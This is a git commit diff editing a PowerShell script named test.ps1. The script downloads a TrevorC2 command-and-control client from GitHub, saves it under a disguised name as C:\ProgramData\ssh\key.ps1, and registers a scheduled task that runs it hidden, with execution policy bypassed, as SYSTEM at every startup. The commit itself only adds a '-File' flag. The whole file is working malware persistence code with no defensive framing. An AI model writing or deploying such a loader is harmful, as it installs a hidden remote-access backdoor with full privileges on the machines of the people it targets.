cdd8bb25ae4d0ed0d279588b06508996917863b5
giaosoissomsm <114545006+giaosoissomsm@users.noreply.github.com>
2025-03-04 00:20:42 -0300

    Update test.ps1

--- scripts/test.ps1
+++ scripts/test.ps1
@@ -2,7 +2,7 @@
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/giaosoissomsm/Webhooks/refs/heads/main/scripts/trevorc2_client.ps1" -OutFile "C:\ProgramData\ssh\key.ps1"
 
 # Cria uma tarefa agendada para iniciar o script como SYSTEM na inicialização com privilégios mais altos
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -ep bypass C:\ProgramData\ssh\key.ps1"
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -ep bypass -File C:\ProgramData\ssh\key.ps1"
 $trigger = New-ScheduledTaskTrigger -AtStartup
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -DisallowStartOnRemoteAppSession
